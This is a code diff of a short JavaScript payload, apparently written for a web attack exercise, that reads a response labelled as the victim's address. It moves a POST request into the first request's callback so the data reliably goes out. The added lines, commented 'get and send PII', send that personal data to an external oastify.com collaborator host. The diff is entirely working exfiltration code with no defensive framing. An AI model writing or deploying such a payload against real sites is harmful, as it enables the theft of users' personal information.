@@ -25,6 +25,13 @@ xhr.onreadystatechange = function() {
   if (xhr.readyState === 4 && xhr.status === 200) {
     var response = xhr.responseText;
     victimAddress = response
+    //get and send PII
+    var reqBody = victimAddress;
+    var xhrr = new XMLHttpRequest();
+    xhrr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
+    xhrr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    var requestBody = reqBody;
+    xhrr.send(requestBody);
     console.log(response);
     // Process the response data here
   } else if (xhr.readyState === 4) {
@@ -35,24 +42,7 @@ xhr.onreadystatechange = function() {
 
 xhr.send(requestBody);
 
-var reqBody = victimAddress;
 
-var xhr = new XMLHttpRequest();
-xhr.open("POST", "https://7ltaq649b33zwlkr5ngy29idr4xvlm9b.oastify.com", true);
-xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-
-xhr.onreadystatechange = function() {
-  if (xhr.readyState === 4 && xhr.status === 200) {
-    var response = xhr.responseText;
-    console.log(response);
-    // Process the response data here
-  } else if (xhr.readyState === 4) {
-    console.log('Request failed with status code:', xhr.status);
-    // Handle any errors that occur during the request
-  }
-};
-var requestBody = reqBody;
-xhr.send(requestBody);
 
 
 
